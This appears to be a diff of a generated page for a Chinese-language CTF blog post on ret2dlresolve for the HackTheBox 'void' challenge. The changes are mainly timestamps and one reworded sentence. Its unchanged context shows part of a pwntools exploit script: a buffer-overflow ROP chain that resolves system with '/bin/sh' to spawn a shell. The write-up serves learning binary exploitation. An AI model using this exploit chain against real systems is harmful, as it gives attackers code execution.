@@ -26,7 +26,7 @@
 <meta property="og:description" content="初見 ret2dlresolve在 HackTheBox CTF 看到 void 這題 結果完全沒想法  x86_64 dynamic link no pie no canary 有給 libc 整個程式就只 call 了一個 read&darr; file  1void: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamical">
 <meta property="og:locale" content="zh_TW">
 <meta property="article:published_time" content="2024-11-17T12:18:22.000Z">
-<meta property="article:modified_time" content="2024-11-26T11:02:35.930Z">
+<meta property="article:modified_time" content="2024-11-27T10:15:46.825Z">
 <meta property="article:author" content="Grissia">
 <meta property="article:tag" content="CTF">
 <meta property="article:tag" content="筆記">
@@ -620,8 +620,8 @@
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2024-11-26 19:02:35</span>
-            <span class="mobile">2024-11-26 19:02:35</span>
+            <span class="desktop">2024-11-27 18:15:46</span>
+            <span class="mobile">2024-11-27 18:15:46</span>
             <span class="hover-info">更新</span>
         </span>
     
@@ -671,7 +671,7 @@
     
     
         <span class="article-wordcount article-meta-item">
-            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>995 字數</span>
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>996 字數</span>
         </span>
     
     
@@ -727,7 +727,7 @@
 <p>為什麼說看不懂呢 因為大家的解法都是用 pwntools 寫腳本就完事</p>
 <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">offset = <span class="number">72</span></span><br><span class="line">dlresolve = Ret2dlresolvePayload(exe, symbol=<span class="string">&quot;system&quot;</span>, args=[<span class="string">&quot;/bin/sh\x00&quot;</span>])</span><br><span class="line"></span><br><span class="line">rop = ROP(exe)</span><br><span class="line">rop.raw(<span class="string">&#x27;A&#x27;</span>*offset)</span><br><span class="line">rop.read(<span class="number">0</span>, dlresolve.data_addr) <span class="comment"># 觸發 read 再讀一次</span></span><br><span class="line">rop.ret2dlresolve(dlresolve) <span class="comment"># 觸發 dlresolve 解析我們輸入的 system 腳本</span></span><br><span class="line">raw_rop = rop.chain()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;============ Dumping ROP =============&quot;</span>)</span><br><span class="line">info(rop.dump())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;======================================&quot;</span>)</span><br><span class="line"></span><br><span class="line">sl(raw_rop)</span><br><span class="line">sl(dlresolve.payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>
 
-<p>這是我解這題用的部分腳本 就 蠻噁心的<br>我甚至從來不知道有 rop 這東西<br>更不知道還可以用 rop.read 直接呼叫<br>更更不知道有個東西叫 Ret2dlresolvePayload 直接把東西都幫我寫好了<br>第一次感受到 pwntools 的偉大</p>
+<p>這是我解這題用的部分腳本 就 蠻噁心的<br>我甚至從來不知道 pwnlib 有 rop 這東西<br>更不知道還可以用 rop.read 直接呼叫<br>更更不知道有個東西叫 Ret2dlresolvePayload 直接把東西都幫我寫好了<br>第一次感受到 pwntools 的偉大</p>
 <h2 id="Ret2dlresolve"><a href="#Ret2dlresolve" class="headerlink" title="Ret2dlresolve"></a>Ret2dlresolve</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>我們知道在執行一個動態編譯的程式時<br>呼叫一個函式 -&gt; plt -&gt; got -&gt; libc<br>下次呼叫同一個函式時就可以直接在 got 中找</p>
 <p>而 linux 中用了下面的函式來動態鏈結到 libc</p>
 <blockquote>
@@ -748,7 +748,7 @@
         
             <li>
                 <strong>更新于
-                    :</strong> 2024-11-26 19:02:35
+                    :</strong> 2024-11-27 18:15:46
             </li>
         
         <li>
